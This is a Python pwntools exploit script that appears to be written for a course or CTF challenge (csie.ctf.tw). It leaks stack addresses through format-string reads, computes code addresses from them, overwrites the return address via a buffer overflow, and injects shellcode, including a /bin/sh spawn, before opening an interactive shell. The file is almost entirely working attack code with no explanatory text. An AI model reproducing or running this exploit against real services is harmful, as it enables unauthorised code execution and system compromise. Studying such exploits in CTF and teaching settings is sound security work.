import binascii
import re

from pwn import *
from pwnlib import shellcraft
from pwnlib.runner import run_assembly

import sys
write = sys.stdout.buffer.write

# context.clear(arch='amd64')
context.arch='amd64'

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10122

r = remote(host, port)

input('press enter to continue')

def get_stacks(beg, end, scanf_arg=b'llx'):
    names = []
    for num in range(beg, end):
        # 1 - Send name
        r.recvuntil('>')
        r.sendline(b'1')
        r.recvuntil(':')
        r.sendline(b'%' + str(num).encode('utf-8') + b'$' + scanf_arg)
        # 2 - Show info
        r.recvuntil('>')
        r.sendline(b'2')
        r.recvuntil(':')
        name = r.recvuntil('*')[:-1]
        names += [name]
        print(num, end=' ')
    print('')
    return names

def input_to_overflow(payload):
    # Gets
    r.recvuntil('>')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(payload)

"""
get addresses
"""
print('='*20)
print('get address')
print('='*20)

stacks = get_stacks(1, 100)
shell_addr = int(stacks[23], 16) + 2101984
main_addr = shell_addr - 2102304

print('main address: {}'.format(format(main_addr, '0x')))
print('shell address: {}'.format(format(shell_addr, '0x')))

"""
overflow return address
(call main again)
"""
print('='*20)
print('overflow return address')
print('='*20)
stacks = get_stacks(6, 100)
write(b' '.join(stacks))
print('')

stacks = [p64(int(stack, 16)) for stack in stacks]
payload = b''.join(stacks[:19])

payload += p64(main_addr)
input_to_overflow(payload)
# stacks = get_stacks(6, 100)
# write(b' '.join(stacks))
# print('')

"""
call return
"""
print('='*20)
print('call return')
print('='*20)
# Exit
r.recvuntil('>')
r.sendline(b'4')

"""
shellcodes
"""

def insert_sc_and_run(shell_code):
    print('')
    print('='*20)
    print('INSERT SHELLCODE AND RUN')
    print('='*20)
    print('')

    """
    insert shellcode
    """
    print('='*20)
    print('insert shellcode')
    print('='*20)
    # 1 - Send name
    r.recvuntil('>')
    r.sendline(b'1')
    r.recvuntil(':')

    r.sendline(shell_code)

    """
    overflow return address
    (call `name`)
    """
    print('='*20)
    print('overflow return address')
    print('='*20)
    stacks = get_stacks(6, 100)
    write(b' '.join(stacks))
    print('')

    stacks = [p64(int(stack, 16)) for stack in stacks]
    payload = b''.join(stacks[:19])

    payload += p64(shell_addr)
    input_to_overflow(payload)
    # stacks = get_stacks(6, 100)
    # write(b' '.join(stacks))
    print('')

    """
    call return
    """
    print('='*20)
    print('call return')
    print('='*20)
    # Exit
    r.recvuntil('>')
    r.sendline(b'4')

sc_move_main = asm(shellcraft.amd64.mov('r14', main_addr)) # len = 28
sc_move_shell = asm(shellcraft.amd64.mov('r15', shell_addr)) # len = 10
sc_read = asm(shellcraft.amd64.linux.read(0, 'rsp', count='24')) # len = 12
sc_sh = asm(shellcraft.amd64.linux.sh()) # len = 24

# insert_sc_and_run(sc_move_main + asm('jmp r14'))

r.interactive()
